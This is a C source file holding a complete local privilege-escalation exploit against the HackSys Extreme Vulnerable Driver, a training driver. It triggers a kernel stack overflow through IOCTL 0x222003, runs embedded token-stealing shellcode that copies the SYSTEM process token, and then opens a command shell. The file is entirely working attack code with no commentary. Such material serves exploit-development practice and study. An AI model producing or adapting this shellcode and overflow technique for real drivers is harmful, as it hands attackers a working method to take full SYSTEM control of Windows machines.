#include <windows.h>
#include <stdio.h>

BYTE token[120] =
{
    0x6a, 0x18, 0x58, 0x6a, 0x5c, 0x59, 0x65, 0x48, 0x8b, 0x04,
    0x88, 0x48, 0x8b, 0x04, 0x48, 0x50, 0x5b, 0x48, 0x8b, 0x9b,
    0x48, 0x04, 0x00, 0x00, 0x48, 0x81, 0xeb, 0x48, 0x04, 0x00,
    0x00, 0x8b, 0x8b, 0x40, 0x04, 0x00, 0x00, 0x83, 0xf9, 0x04,
    0x75, 0xe7, 0x48, 0x8b, 0x8b, 0xb8, 0x04, 0x00, 0x00, 0x80,
    0xe1, 0xf0, 0x48, 0x89, 0x88, 0xb8, 0x04, 0x00, 0x00, 0x65,
    0x48, 0x8b, 0x04, 0x25, 0x88, 0x01, 0x00, 0x00, 0x66, 0x8b,
    0x88, 0xe4, 0x01, 0x00, 0x00, 0x66, 0xff, 0xc1, 0x66, 0x89,
    0x88, 0xe4, 0x01, 0x00, 0x00, 0x6a, 0x56, 0x59, 0x48, 0x8b,
    0x54, 0x48, 0xe4, 0x48, 0x8b, 0x2c, 0x8a, 0x4c, 0x8b, 0x5c,
    0x8a, 0x20, 0x48, 0x8b, 0x64, 0x8a, 0x28, 0x48, 0x8b, 0x4c,
    0x8a, 0x10, 0x31, 0xc0, 0x0f, 0x01, 0xf8, 0x48, 0x0f, 0x07
};

int main()
{
    LPVOID payload = VirtualAlloc(NULL, 2080, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    LPVOID shellcode = VirtualAlloc(NULL, 120, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    RtlFillMemory(payload, 2072, 'A');
    RtlCopyMemory(shellcode, token, 120);

    *((ULONGLONG *) ((BYTE *) payload + 2072)) = (ULONGLONG) shellcode;

    HANDLE handle = CreateFile(L"\\\\.\\HacksysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);

    if (handle == INVALID_HANDLE_VALUE)
    {
        puts("[-] Failed to get handle");
        exit(1);
    }

    DeviceIoControl(handle, 0x222003, payload, 2080, NULL, 0, NULL, NULL);

    system("cmd.exe");
    exit(0);

    return 0;
}
